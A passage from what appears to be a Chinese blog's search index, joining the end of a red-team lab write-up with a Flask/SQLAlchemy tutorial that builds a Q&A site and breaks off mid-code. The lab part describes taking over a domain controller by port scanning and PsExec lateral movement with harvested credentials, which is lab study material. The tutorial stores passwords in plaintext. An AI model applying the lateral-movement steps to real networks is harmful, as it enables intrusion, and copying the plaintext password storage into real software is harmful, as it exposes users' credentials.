/domain查询域控\n\n域控为DC\n\nSMB横向移动首先端口扫描explore–&gt;Port scan,我们这里使用的是 SMB 横向，就扫描常见的 3389和445\n\n通过端口扫描在View-&gt;Targets中可以看到存活的主机\n这里可以看到这个域内的存活机器\n接下来利用PsExec横向上线\n关于PsEXec\npsexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet 服务的时候返回一个半交互的命令行，像 telnet 客户端一样。原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec 建立连接之后对方机器上会被安装一个服务。\n\n\n\n在目标主机图表上右击，jump–&gt;PsExec 或在命令行中执行 psexec\n\n接下来利用刚刚获取到的账密进行配置\n\n而后点击Launch\n至此，成功接管域控\n\n","slug":"内网靶场实战——ATT&CK实战系列（二）","date":"2023-03-19T09:50:20.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"2856bf724d46606b60ef8e9389133460","title":"Flask 从0到0.1 part-02","content":"Flask连接mysql数据库这个前提的话我们需要两个模块，即pymysql和sqlalchemy，前者用于连接mysql，后者是他提供了一种名为ORM的技术，使得我们不用通过Mysql的原生指令来执行命令，而是通过Python操作普通对象似的执行mysql语句。\n主入口文件app.py内容如下\nfrom flask import Flask #从Flask包中调用flask\nfrom flask_sqlalchemy import SQLAlchemy\napp = Flask(__name__)\n\n#在app.config中设置连接数据库的信息\n#使用SQLALchemy(app)创建一个数据库对象\n#SQLALchemy会自动读取app.config中连接数据库的信息\n\n#Mysql的主机名\nHOSTNAME = \"127.0.0.1\"\n#Mysql的端口号，默认3306\nPORT = 3306\n#连接Mysql的用户名\nUSERNAME = \"root\"\n#连接Mysql的密码\nPASSWORD = \"root\"\n#Mysql上创建的数据库名称\nDATABASE = \"flask\"\n\napp.config['SQLALCHEMY_DATABASE_URI'] = f\"mysql+pymysql://&#123;USERNAME&#125;:&#123;PASSWORD&#125;@&#123;HOSTNAME&#125;:&#123;PORT&#125;/&#123;DATABASE&#125;?charset=utf8mb4\"\n\ndb = SQLAlchemy(app)\n\nwith app.app_context(): \n    with db.engine.connect() as conn:\n        rs = conn.execute(\"select 1\")#当连接成功时就执行select 1 语句\n        print(rs.fetchone())\n\n@app.route('/')\ndef hello_world():\n    return \"Hello\"\n\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n接下来在Navicat中创建一个数据库，命名为flask\n\n接下来启动项目\n\n可以发现结果为1，与select 1对应，说明连接成功\nORM模型ORM，即对象关系映射。\n一个ORM模型对应数据库中的一个表，ORM模型中的每个类属性分别对应表的每个字段，ORM模型中的每个类属性分别对应表的每个字段，ORM模型的每个实例对象对应表中每条记录。\n接下来说一下创建数据表，然后设置字段即标明主键的实现方式，主入口文件app.py内容如下\nfrom flask import Flask #从Flask包中调用flask\nfrom flask_sqlalchemy import SQLAlchemy\napp = Flask(__name__)\n\n#在app.config中设置连接数据库的信息\n#使用SQLALchemy(app)创建一个数据库对象\n#SQLALchemy会自动读取app.config中连接数据库的信息\n\n#Mysql的主机名\nHOSTNAME = \"127.0.0.1\"\n#Mysql的端口号，默认3306\nPORT = 3306\n#连接Mysql的用户名\nUSERNAME = \"root\"\n#连接Mysql的密码\nPASSWORD = \"root\"\n#Mysql上创建的数据库名称\nDATABASE = \"flask\"\n\napp.config['SQLALCHEMY_DATABASE_URI'] = f\"mysql+pymysql://&#123;USERNAME&#125;:&#123;PASSWORD&#125;@&#123;HOSTNAME&#125;:&#123;PORT&#125;/&#123;DATABASE&#125;?charset=utf8mb4\"\n\ndb = SQLAlchemy(app)\n\nclass User(db.Model):\n    __tablename__ = \"user\" #表名\n    id = db.Column(db.Integer,primary_key=True,autoincrement=True) #字段 ,Integer为整型，Primary_key=True为主键\n    username = db.Column(db.String(100),nullable=False)\n    password = db.Column(db.String(100),nullable=False)\n\n#user = User(username=\"赵四\",password='6666') #导入至数据库中\n# sql: insert user(username,password) values(\"赵四\"，'6666')\n\nwith app.app_context():\n    db.create_all() #将表映射至数据库中\n\n\n@app.route('/')\ndef hello_world():\n    return \"Hello\"\n\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n接下来运行文件\n\n在navicat中可以发现成功创建了user表，且其内含有三个字段，id、username和password\n增删改查增首先说一下增，大致就是三步\n1、创建ORM对象2、将对象添加到db.session中3、将db.session中的改变同步于数据库中\n具体代码如下所示\nfrom flask import Flask #从Flask包中调用flask\nfrom flask_sqlalchemy import SQLAlchemy\napp = Flask(__name__)\n\n#在app.config中设置连接数据库的信息\n#使用SQLALchemy(app)创建一个数据库对象\n#SQLALchemy会自动读取app.config中连接数据库的信息\n\n#Mysql的主机名\nHOSTNAME = \"127.0.0.1\"\n#Mysql的端口号，默认3306\nPORT = 3306\n#连接Mysql的用户名\nUSERNAME = \"root\"\n#连接Mysql的密码\nPASSWORD = \"root\"\n#Mysql上创建的数据库名称\nDATABASE = \"flask\"\n\napp.config['SQLALCHEMY_DATABASE_URI'] = f\"mysql+pymysql://&#123;USERNAME&#125;:&#123;PASSWORD&#125;@&#123;HOSTNAME&#125;:&#123;PORT&#125;/&#123;DATABASE&#125;?charset=utf8mb4\"\n\ndb = SQLAlchemy(app)\n\nclass User(db.Model):\n    __tablename__ = \"user\" #表名\n    id = db.Column(db.Integer,primary_key=True,autoincrement=True) #字段 ,Integer为整型，Primary_key=True为主键\n    username = db.Column(db.String(100),nullable=False)\n    password = db.Column(db.String(100),nullable=False)\n\nwith app.app_context():\n    db.create_all() #将表映射至数据库中\n\n@app.route('/')\ndef hello_world():\n    return \"Hello\"\n\n@app.route('/user/add')\ndef add_user():\n    # 1、创建ORM对象\n    # 2、将对象添加到db.session中\n    # 3、将db.session中的改变同步于数据库中\n    user = User(username=\"赵四\",password='6666')\n    db.session.add(user)\n    db.session.commit()\n    return \"用户创建成功\"\n\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n接下来去访问/user/add路由\n\n接下来去Navicat中查看user表\n\n成功添加\n查具体查的方法有两种\n1、get查找:根据主键查找\n2、filter_by查找\n\n第一种方法一次只能查一条数据，所以我们常用的是第二个，接下来使用具体代码来进行演示。\napp.py内容如下\nfrom flask import Flask #从Flask包中调用flask\nfrom flask_sqlalchemy import SQLAlchemy\napp &#x3D; Flask(__name__)\n\n#在app.config中设置连接数据库的信息\n#使用SQLALchemy(app)创建一个数据库对象\n#SQLALchemy会自动读取app.config中连接数据库的信息\n\n#Mysql的主机名\nHOSTNAME &#x3D; &quot;127.0.0.1&quot;\n#Mysql的端口号，默认3306\nPORT &#x3D; 3306\n#连接Mysql的用户名\nUSERNAME &#x3D; &quot;root&quot;\n#连接Mysql的密码\nPASSWORD &#x3D; &quot;root&quot;\n#Mysql上创建的数据库名称\nDATABASE &#x3D; &quot;flask&quot;\n\napp.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] &#x3D; f&quot;mysql+pymysql:&#x2F;&#x2F;&#123;USERNAME&#125;:&#123;PASSWORD&#125;@&#123;HOSTNAME&#125;:&#123;PORT&#125;&#x2F;&#123;DATABASE&#125;?charset&#x3D;utf8mb4&quot;\n\ndb &#x3D; SQLAlchemy(app)\n\nclass User(db.Model):\n    __tablename__ &#x3D; &quot;user&quot; #表名\n    id &#x3D; db.Column(db.Integer,primary_key&#x3D;True,autoincrement&#x3D;True) #字段 ,Integer为整型，Primary_key&#x3D;True为主键\n    username &#x3D; db.Column(db.String(100),nullable&#x3D;False)\n    password &#x3D; db.Column(db.String(100),nullable&#x3D;False)\n\n#user &#x3D; User(id&#x3D;1,username&#x3D;&quot;quan9i&quot;,password&#x3D;&#39;6666&#39;) #导入至数据库中\n# sql: insert user(username,password) values(&quot;赵四&quot;，&#39;6666&#39;)\n\nwith app.app_context():\n    db.create_all() #将表映射至数据库中\n\n\n@app.route(&#39;&#x2F;&#39;)\ndef hello_world():\n    return &quot;Hello&quot;\n\n@app.route(&#39;&#x2F;user&#x2F;query&#39;)\ndef query_user():\n    #1、get查找:根据主键查找\n    #user &#x3D;User.query.get(1)\n    #print(f&quot;&#123;user.id&#125;:&#123;user.username&#125;&#x2F;&#123;user.password&#125;&quot;)\n    \n    #2、filter_by查找\n    users &#x3D; User.query.filter_by(username&#x3D;&quot;赵四&quot;)\n    #print(type(users))\n    for user in users:\n        print(user.username)\n    return &quot;数据查找成功&quot;\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;: #如果当前文件为主入口，就会往下运行\n    app.run()\n\n接下来访问/user/query路由\n\n而后我们可以发现此时已经有回显了\n\n成功查找\n改具体步骤就是三步\n1、查到具体的数据\n2、对数据进行修改\n3、数据同步\n具体app.py内容如下\nfrom flask import Flask #从Flask包中调用flask\nfrom flask_sqlalchemy import SQLAlchemy\napp = Flask(__name__)\n\n#在app.config中设置连接数据库的信息\n#使用SQLALchemy(app)创建一个数据库对象\n#SQLALchemy会自动读取app.config中连接数据库的信息\n\n#Mysql的主机名\nHOSTNAME = \"127.0.0.1\"\n#Mysql的端口号，默认3306\nPORT = 3306\n#连接Mysql的用户名\nUSERNAME = \"root\"\n#连接Mysql的密码\nPASSWORD = \"root\"\n#Mysql上创建的数据库名称\nDATABASE = \"flask\"\n\napp.config['SQLALCHEMY_DATABASE_URI'] = f\"mysql+pymysql://&#123;USERNAME&#125;:&#123;PASSWORD&#125;@&#123;HOSTNAME&#125;:&#123;PORT&#125;/&#123;DATABASE&#125;?charset=utf8mb4\"\n\ndb = SQLAlchemy(app)\n\nclass User(db.Model):\n    __tablename__ = \"user\" #表名\n    id = db.Column(db.Integer,primary_key=True,autoincrement=True) #字段 ,Integer为整型，Primary_key=True为主键\n    username = db.Column(db.String(100),nullable=False)\n    password = db.Column(db.String(100),nullable=False)\n\n#user = User(id=1,username=\"quan9i\",password='6666') #导入至数据库中\n# sql: insert user(username,password) values(\"赵四\"，'6666')\n\nwith app.app_context():\n    db.create_all() #将表映射至数据库中\n\n\n@app.route('/')\ndef hello_world():\n    return \"Hello\"\n\n@app.route('/user/update')\ndef update_user():\n    user = User.query.filter_by(username=\"赵四\").first()#first()也可以替换为[0]，get(1)也可以\n    user.password = \"2222\"\n    db.session.commit()\n    return \"数据修改成功\"\n\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n接下来访问/user/update路由\n\n查看Navicat\n\n可以发现成功修改\n删具体步骤也是三步\n1、查找数据\n2、通过db.session删除数据\n3、同步到数据库\n具体代码如下\nfrom flask import Flask #从Flask包中调用flask\nfrom flask_sqlalchemy import SQLAlchemy\napp = Flask(__name__)\n\n#在app.config中设置连接数据库的信息\n#使用SQLALchemy(app)创建一个数据库对象\n#SQLALchemy会自动读取app.config中连接数据库的信息\n\n#Mysql的主机名\nHOSTNAME = \"127.0.0.1\"\n#Mysql的端口号，默认3306\nPORT = 3306\n#连接Mysql的用户名\nUSERNAME = \"root\"\n#连接Mysql的密码\nPASSWORD = \"root\"\n#Mysql上创建的数据库名称\nDATABASE = \"flask\"\n\napp.config['SQLALCHEMY_DATABASE_URI'] = f\"mysql+pymysql://&#123;USERNAME&#125;:&#123;PASSWORD&#125;@&#123;HOSTNAME&#125;:&#123;PORT&#125;/&#123;DATABASE&#125;?charset=utf8mb4\"\n\ndb = SQLAlchemy(app)\n\nclass User(db.Model):\n    __tablename__ = \"user\" #表名\n    id = db.Column(db.Integer,primary_key=True,autoincrement=True) #字段 ,Integer为整型，Primary_key=True为主键\n    username = db.Column(db.String(100),nullable=False)\n    password = db.Column(db.String(100),nullable=False)\n\n#user = User(id=1,username=\"quan9i\",password='6666') #导入至数据库中\n# sql: insert user(username,password) values(\"赵四\"，'6666')\n\nwith app.app_context():\n    db.create_all() #将表映射至数据库中\n\n\n@app.route('/')\ndef hello_world():\n    return \"Hello\"\n\n@app.route('/user/delete')\ndef delete_user():\n    user = User.query.get(1)\n    db.session.delete(user)\n    db.session.commit()\n    return \"数据删除成功\"\n\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n\n\n\n接下来查看Navicat\n\n外键关系型数据库中有一个强大的功能，即多个表之间可以建立关系。比如文章表中，需要存储作者数据，我们这里不需要把作者数据放入文章表中，通过外键引用用户表即可。接下来说一下具体实现\n首先我们在前的基础上创建一个article表，具体代码如下\nclass Article(db.Model)\n\t__tablename__ = \"article\"\n    id = db.Column(db.Integer,primary_key=True,autoincrement=True)\n    title = db.Column(db.String(200),nullable=False)\n    content = db.Column(db.Text,nullable=False)\n    \n    #添加作者的外键\n    author_id = db.Column()\n    \narticle = Article(title=\"Flask从0到0.1\"，content=\"Flask\")\n\n接下来介绍一下relationship，它其实就是自动查找了一下\nauthor = db.relationship(\"User\") #此时它会自动寻找User表中有关此外键的信息\n#操作类似于  article.author = user.query.get(article.author_id)\n\n接下来我们是可以通过这个来访问到author，但如果我们想获取某作者所有的文章，该如何进行操作呢，具体代码如下\nauthor = db.relationship(\"User\",backref=\"articles\")\n#backref会自动给User模型添加一个article属性，用来获取文章列表\n\n综上，整体代码如下\nfrom flask import Flask #从Flask包中调用flask\nfrom flask_sqlalchemy import SQLAlchemy\napp = Flask(__name__)\n\n#在app.config中设置连接数据库的信息\n#使用SQLALchemy(app)创建一个数据库对象\n#SQLALchemy会自动读取app.config中连接数据库的信息\n\n#Mysql的主机名\nHOSTNAME = \"127.0.0.1\"\n#Mysql的端口号，默认3306\nPORT = 3306\n#连接Mysql的用户名\nUSERNAME = \"root\"\n#连接Mysql的密码\nPASSWORD = \"root\"\n#Mysql上创建的数据库名称\nDATABASE = \"flask\"\n\napp.config['SQLALCHEMY_DATABASE_URI'] = f\"mysql+pymysql://&#123;USERNAME&#125;:&#123;PASSWORD&#125;@&#123;HOSTNAME&#125;:&#123;PORT&#125;/&#123;DATABASE&#125;?charset=utf8mb4\"\n\ndb = SQLAlchemy(app)\n\nclass User(db.Model):\n    __tablename__ = \"user\" #表名\n    id = db.Column(db.Integer,primary_key=True,autoincrement=True) #字段 ,Integer为整型，Primary_key=True为主键\n    username = db.Column(db.String(100),nullable=False)\n    password = db.Column(db.String(100),nullable=False)\n\n\nclass Article(db.Model):\n    __tablename__ = \"article\"\n    id = db.Column(db.Integer, primary_key=True, autoincrement=True)\n    title = db.Column(db.String(200), nullable=False)\n    content = db.Column(db.Text, nullable=False)\n\n    # 添加作者的外键\n    author_id = db.Column(db.Integer,db.ForeignKey(\"user.id\"))\n    author = db.relationship(\"User\",backref=\"articles\")\n\narticle = Article(title=\"Flask学习大纲\",content=\"Flaskxxxx\")\n\n#author = db.relationship(\"User\") #此时它会自动寻找User表中有关此外键的信息\n#操作类似于  article.author = user.query.get(article.author_id)\nwith app.app_context():\n    db.create_all() #将表映射至数据库中\n\n\n@app.route('/')\ndef hello_world():\n    return \"Hello\"\n\n\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n迁移ORM模型这里的话，用到了一个模块，migrate，所以我们首先需要去下载一下这个模块，具体指令如下\npip install flask-migrate\n\n\n\nORM模型映射成表的三步\n1、flask db init 只需执行一次\n2、flask db migrate 识别ORM模型的改变，生成脚本\n3、flask db upgrade 运行脚本，同步到数据库中\n主入口文件app.py内容如下\nfrom flask import Flask #从Flask包中调用flask\nfrom flask_sqlalchemy import SQLAlchemy\nfrom flask_migrate import Migrate\n# pip install flask-migrate\napp = Flask(__name__)\n\n#在app.config中设置连接数据库的信息\n#使用SQLALchemy(app)创建一个数据库对象\n#SQLALchemy会自动读取app.config中连接数据库的信息\n\n#Mysql的主机名\nHOSTNAME = \"127.0.0.1\"\n#Mysql的端口号，默认3306\nPORT = 3306\n#连接Mysql的用户名\nUSERNAME = \"root\"\n#连接Mysql的密码\nPASSWORD = \"root\"\n#Mysql上创建的数据库名称\nDATABASE = \"flask\"\n\napp.config['SQLALCHEMY_DATABASE_URI'] = f\"mysql+pymysql://&#123;USERNAME&#125;:&#123;PASSWORD&#125;@&#123;HOSTNAME&#125;:&#123;PORT&#125;/&#123;DATABASE&#125;?charset=utf8mb4\"\n\ndb = SQLAlchemy(app)\n\nmigrate = Migrate(app,db)\n\nclass User(db.Model):\n    __tablename__ = \"user\" #表名\n    id = db.Column(db.Integer,primary_key=True,autoincrement=True) #字段 ,Integer为整型，Primary_key=True为主键\n    username = db.Column(db.String(100),nullable=False)\n    password = db.Column(db.String(100),nullable=False)\n    email = db.Column(db.String(100))\n\nclass Article(db.Model):\n    __tablename__ = \"article\"\n    id = db.Column(db.Integer, primary_key=True, autoincrement=True)\n    title = db.Column(db.String(200), nullable=False)\n    content = db.Column(db.Text, nullable=False)\n\n    # 添加作者的外键\n    author_id = db.Column(db.Integer,db.ForeignKey(\"user.id\"))\n    author = db.relationship(\"User\",backref=\"articles\")\n\narticle = Article(title=\"Flask学习大纲\",content=\"Flaskxxxx\")\n\n#author = db.relationship(\"User\") #此时它会自动寻找User表中有关此外键的信息\n#操作类似于  article.author = user.query.get(article.author_id)\nwith app.app_context():\n    db.create_all() #将表映射至数据库中\n\n\n@app.route('/')\ndef hello_world():\n    return \"Hello\"\n\n\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n首先执行flask db init，而后会生成\n\n接下来执行flask db migrate和flask db upgrade\n\n接下来查看数据库，这个alembic_version用于查看版本\n\n接下来点击设计表\n\n这里可以发现我们的email字段已经写入\n问答平台搭建前期准备，大致思路如下\n我们的数据库连接这种，如果每次都写语句连接则过于繁琐，这个我们把它写进一个配置文件，然后我们进行引用，连接数据库即可，所以这就需要第一个文件，config.py，第二个，则是我们需要一个模块文件models.py，用来存放ORM模型，第三个呢，是我们需要的一些拓展的东西，比如SQLAlchemy，我们可以把它放入一个扩展文件exts.py中，这样引用比较方便，不过它的主要作用其实是为了避免循环引用的问题，具体如下\n当没有exts.py，我们的SQLAlchemy这种就要写入到主文件app.py中，而models.py需要引用这个，所以就会通过from app import db指向app.py文件，但主文件app.py也需要这个ORM模型，所以它会通过from models import UserModel指向models.py文件。\n他们的关系如下图\n\n而此时就会造成一个循环引用的问题，这样引用超过一定次数就会出现bug，而当引用exts.py后，它的关系如下所示\n\n此时就完美解决了它的问题\n然后呢，我们还需要一个蓝图文件夹，用于进行一个简单分类。比如豆瓣网，存在电影、读书、生活等多个方面，那我们就把电影作为蓝图文件夹下的一个文件，读书作为蓝图文件夹下的另一个文件，生活亦是如此。\n那我们这里的话，比如我们想实现一个问答界面，它肯定是需要注册和登录的，所以我们这里就可以去创建两个文件，一个命名为auth.py，用于搞用户注册和登录，另一个命名为qa，用于搞问答。所以最终的大致情况如下所示\n\n各文件内容如下\n#app.py\nfrom flask import Flask\nimport config\nfrom exts import db\nfrom models import UserModel\nfrom blueprints.qa import bp as qa_bp\nfrom blueprints.auth import bp as auth_bp\n\napp = Flask(__name__)\n\n#绑定配置文件\napp.config.from_object(config)\n\n\ndb.init_app(app)\n\napp.register_blueprint(qa_bp)\napp.register_blueprint(auth_bp)\n\n@app.route('/')\ndef hello_world():  # put application's code here\n    return 'Hello World!'\n\n\nif __name__ == '__main__':\n    app.run()\n\n#exts.py\n#该文件存在是为了解决循环引用的问题\n# flask-sqlalchemy\nfrom flask_sqlalchemy import SQLAlchemy\n\ndb = SQLAlchemy()\n\n#models.py\nfrom exts import  db\n\nclass UserModel(db.Model):\n    pass\n\n#auth.py\nfrom flask import  Blueprint\n\nbp= Blueprint(\"auth\",__name__,url_prefix=\"/auth\")\n\n@bp.route(\"/login\")\ndef login():\n    pass\n\n#qa.py\nfrom flask import Blueprint\n\nbp = Blueprint(\"qa\",__name__,url_prefix=\"/\")\n\n@bp.route(\"/\")\ndef index():\n    pass\n\n\nUser模型创建首先我们需要配置连接数据库，这里我们新建一个数据库，命名为demo\n\n然后呢，我们需要去配置一下这个config.py文件，使得它可以与数据库实现连接\n\n\n#Mysql的主机名\nHOSTNAME = \"127.0.0.1\"\n#Mysql的端口号，默认3306\nPORT = '3306'\n#连接Mysql的用户名\nUSERNAME = \"root\"\n#连接Mysql的密码\nPASSWORD = \"root\"\n#Mysql上创建的数据库名称\nDATABASE = \"demo\"\n\nDB_URI = f\"mysql+pymysql://&#123;USERNAME&#125;:&#123;PASSWORD&#125;@&#123;HOSTNAME&#125;:&#123;PORT&#125;/&#123;DATABASE&#125;?charset=utf8mb4\"\nSQLALCHEMY_DATABASE_URI = DB_URI\n\n接下来的话，配置一下模型文件，即models.py，对于这个，需要新添一些字段，比如email用于注册，join_time用于显示注册时间。\nfrom exts import  db\nfrom datetime import  datetime\n\nclass UserModel(db.Model):\n    __tablename__ = \"user\"\n    id = db.Column(db.Integer,primary_key=True,autoincrement=True)\n    username = db.Column(db.String(100),nullable=True)\n    password = db.Column(db.String(100), nullable=True)\n    email = db.Column(db.String(100), nullable=True,unique=True)\n    join_time = db.Column(db.DateTime, default=datetime.now)\n\n然后我们需要在app.py中进行Migrate的简单配置，具体文件如下\nfrom flask import Flask\nimport config\nfrom exts import db\nfrom models import UserModel\nfrom blueprints.qa import bp as qa_bp\nfrom blueprints.auth import bp as auth_bp\nfrom flask_migrate import Migrate\n\n\napp = Flask(__name__)\n\n#绑定配置文件\napp.config.from_object(config)\n\n\ndb.init_app(app)\n\nmigrate = Migrate(app,db)\n\napp.register_blueprint(qa_bp)\napp.register_blueprint(auth_bp)\n\n@app.route('/')\ndef hello_world():  # put application's code here\n    return 'Hello World!'\n\n\nif __name__ == '__main__':\n    app.run()\n\n\n接下来去执行db三部曲即可\n1、flask db init\n2、flask db migrate\n3、flask db upgrate\n此时再查看数据库\n\nuser表已建立成功。\n注册界面设计接下来首先我们需要使用一个HTML+CSS+JS模板，这里我使用的是这个https://blog.csdn.net/weixin_46048542/article/details/127968514\n接下来将index.html界面上传到templates文件夹下，css和js文件则上传到static文件夹下\n\n接下来修改auth.py文件，对内容进行一个渲染\nfrom flask import Blueprint,render_template\n\nbp= Blueprint(\"auth\",__name__,url_prefix=\"/auth\")\n\n@bp.route(\"/login\")\ndef login():\n    pass\n\n@bp.route(\"/register\")\ndef register():\n    return render_template(\"index.html\")\n\n此时运行程序，访问/auth/register路由\n\n此时发现这个没有美化，这是为什么呢，这是因为html中加载css的方式是绝对路径的方式\n\n而在Flask这里，我们应该使用的是&#123;&#123;url_for&#125;&#125;这种方式，所以需要对它进行简单更改，修改为如下方式\n&lt;link rel=\"stylesheet\" href=\"&#123;&#123; url_for('static',filename='css/style.css') &#125;&#125;\">\n\n此时再次进行访问\n\n可以发现界面一样，但这个太简单了，只有一个index.html，没有办法去写继承什么的，所以我又找了一个https://github.com/Yourdaylight/javaWeb-Study\n下载后我们做同上操作即可，然后我们就可以开始继承了\n\n\n可以发现上层和底部，都是一样的，所以我们可以写入一个base.html，然后让其他html界面引用，实现一个继承，具体代码如下所示\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>&#123;% block title %&#125;&#123;% endblock %&#125;&lt;/title>\n    &#123;%block head%&#125;&#123;% endblock %&#125;\n    &lt;link rel=\"stylesheet\" href=\"&#123;&#123; url_for('static',filename='css/regist.css')&#125;&#125;\">\n    &lt;link rel=\"shortcut icon\" href=\"&#123;&#123; url_for('static',filename='images/camera.ico')&#125;&#125;\">\n    &lt;script type=\"text/javascript\" src=\"&#123;&#123; url_for('static',filename='js/regist.js')&#125;&#125;\">&lt;/script>\n    &lt;script src=\"https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js\">&lt;/script>\n&lt;/head>\n&lt;body>\n\n&#123;% block body %&#125;&#123;% endblock %&#125;\n&lt;div id=\"footer\">\n    &lt;div class=\"link\">\n        &lt;a href=\"\">关于我们&lt;/a>\n        |\n        &lt;a href=\"\">联系我们&lt;/a>\n        |\n        &lt;a href=\"\">商家入驻&lt;/a>\n        |\n        &lt;a href=\"\">友情链接&lt;/a>\n        |\n    &lt;/div>\n    &lt;div class=\"copyright\">\n        Copyright © 1999 - 2020 LZH. All Rights Reserved.\n    &lt;/div>\n\n&lt;script type=\"text/javascript\" src=\"&#123;&#123; url_for('static',filename='js/regist.js')&#125;&#125;\">&lt;/script>\n&lt;/body>\n&lt;/html>\n\n\n而接下来去写register.html界面\n&#123;% extends \"base.html\" %&#125;\n\n&#123;% block tile %&#125;注册&#123;% endblock %&#125;\n\n&#123;% block head %&#125;&#123;% endblock %&#125;\n\n&#123;% block body %&#125;\n    &lt;!--头部-->\n&lt;div id=\"reg_header\">\n    &lt;div class=\"reg_h_center\">\n        &lt;div class=\"reg_h_left\">\n            &lt;img src=\"&#123;&#123; url_for('static',filename='images/logo.png')&#125;&#125;\" alt=\"\">\n            &lt;h3>欢迎注册&lt;/h3>\n        &lt;/div>\n    &lt;/div>\n&lt;/div>\n\n\n&lt;!--表单内容-->\n&lt;div class=\"reg_back\">\n    &lt;div class=\"reg_left\">\n        &lt;p>新用户注册&lt;/p>\n        &lt;p>USER REGISTER&lt;/p>\n    &lt;/div>\n\n&lt;!--    表单列表-->\n    &lt;div class=\"reg_center\">\n        &lt;div class=\"reg_form\">\n            &lt;form action=\"#\" method=\"post\" id=\"form\">\n                &lt;table>\n                    &lt;tr>\n                        &lt;td class=\"td_left\">&lt;label for=\"username\">用户名&lt;/label>&lt;/td>\n                        &lt;td class=\"td_right\">&lt;input type=\"text\" name=\"username\" placeholder=\"请输入用户名\"\n                                                    id=\"username\">\n                            &lt;span id=\"s_username\" class=\"error\">&lt;/span>\n                        &lt;/td>\n\n                    &lt;/tr>\n\n                    &lt;tr>\n                        &lt;td class=\"td_left\">&lt;label for=\"password\">密码&lt;/label>&lt;/td>\n                        &lt;td class=\"td_right\">&lt;input type=\"password\" name=\"password\" placeholder=\"请输入密码(请设置6-12位字符)\"\n                                                    id=\"password\">\n                            &lt;span id=\"s_password\" class=\"error\">&lt;/span>\n                        &lt;/td>\n\n                    &lt;/tr>\n\n                    &lt;tr>\n                        &lt;td class=\"td_left\">&lt;label for=\"repassword\">确认密码&lt;/label>&lt;/td>\n                        &lt;td class=\"td_right\">&lt;input type=\"password\" name=\"repassword\" placeholder=\"请输入密码\"\n                                                    id=\"repassword\">\n                            &lt;span id=\"s_repassword\" class=\"error\">&lt;/span>\n                        &lt;/td>\n\n                    &lt;/tr>\n\n                    &lt;tr>\n                        &lt;td class=\"td_left\">&lt;label for=\"email\">Email&lt;/label>&lt;/td>\n                        &lt;td class=\"td_right\">&lt;input type=\"email\" name=\"email\" placeholder=\"请输入Email\" id=\"Email\">\n                            &lt;span id=\"s_email\" class=\"error\">&lt;/span>\n                        &lt;/td>\n\n                    &lt;/tr>\n\n                    &lt;tr>\n                        &lt;td class=\"td_left\">&lt;label for=\"rename\">姓名&lt;/label>&lt;/td>\n                        &lt;td class=\"td_right\">&lt;input type=\"text\" name=\"rename\" placeholder=\"请输入真实姓名\" id=\"rename\">\n\n                            &lt;span id=\"s_rename\" class=\"error\">&lt;/span>\n                        &lt;/td>\n\n                    &lt;/tr>\n\n                    &lt;tr>\n                        &lt;td class=\"td_left\">&lt;label for=\"Telphone\">手机号&lt;/label>&lt;/td>\n                        &lt;td class=\"td_right\">&lt;input type=\"text\" name=\"telphone\" placeholder=\"请输入您的手机号\"\n                                                    id=\"Telphone\">\n                            &lt;span id=\"s_telphone\" class=\"error\">&lt;/span>\n                        &lt;/td>\n\n                    &lt;/tr>\n\n                    &lt;tr>\n                        &lt;td class=\"td_left\">&lt;label>性别&lt;/label>&lt;/td>\n                        &lt;td class=\"td_right\">&lt;input type=\"radio\" name=\"gender\" value=\"male\" checked> 男\n                            &lt;input type=\"radio\" name=\"gender\" value=\"female\"> 女\n                        &lt;/td>\n\n\n                    &lt;/tr>\n\n                    &lt;tr>\n                        &lt;td class=\"td_left\">&lt;label for=\"Birthday\">生日(选填)&lt;/label>&lt;/td>\n                        &lt;td class=\"td_right\">&lt;input type=\"date\" name=\"birthday\" id=\"Birthday\">&lt;/td>\n                    &lt;/tr>\n\n                    &lt;tr>\n                        &lt;td class=\"td_left\">&lt;label for=\"checkcode\">验证码&lt;/label>&lt;/td>\n                        &lt;td class=\"td_right\">\n                            &lt;div class=\"all\">\n                            &lt;input type=\"text\" name=\"checkcode\" id=\"checkcode\">\n                            &lt;div class=\"code\">&lt;/div>\n                                &lt;a href=\"#\" class=\"change\">看不清，换一张&lt;/a>\n\n                            &lt;/div>\n                        &lt;/td>\n                    &lt;/tr>\n\n\n                &lt;/table>\n\n                &lt;tr>\n                    &lt;td colspan=\"2\" align=\"center\">\n                        &lt;button type=\"button\" value=\"注册\" id=\"btn_sub\" onclick=\"submitForm()\">注册&lt;/button>\n                    &lt;/td>\n\n                    &lt;td colspan=\"2\" align=\"center\">\n                        &lt;button id=\"reset\" value=\"重置\" >重置&lt;/button>\n                    &lt;/td>\n                &lt;/tr>\n            &lt;/form>\n        &lt;/div>\n    &lt;/div>\n\n    &lt;div class=\"reg_right\">\n        &lt;p>已有账号?&lt;a href=\"login.html\">立即登录&lt;/a>&lt;/p>\n    &lt;/div>\n&#123;% endblock %&#125;\n\n\n与静态界面相似，成功加载。\n注册界面验证对于注册，我们肯定需要验证，验证码是否输入正确，用户名和密码是否符号长度规则，密码是否正确，那么它如何实现呢，这里用一个名为flask-wtf的模块来进行实现，所以首先我们需要去安装一下这个模块,在终端执行pip install flask-wtf即可\n而后我们在根目录下新建一个文件，这里命名为form.py，其内容如下\n#forms.py\nimport wtforms\nfrom wtforms.validators import Email,Length,EqualTo\nfrom models import  UserModel ,EmailCaptchaModel\nfrom models import  db\n\nclass RegisterFrom(wtforms.Form)\n    email = wtforms.StringField(validators=[Email(message=\"邮箱格式错误\")])\n    captcha = 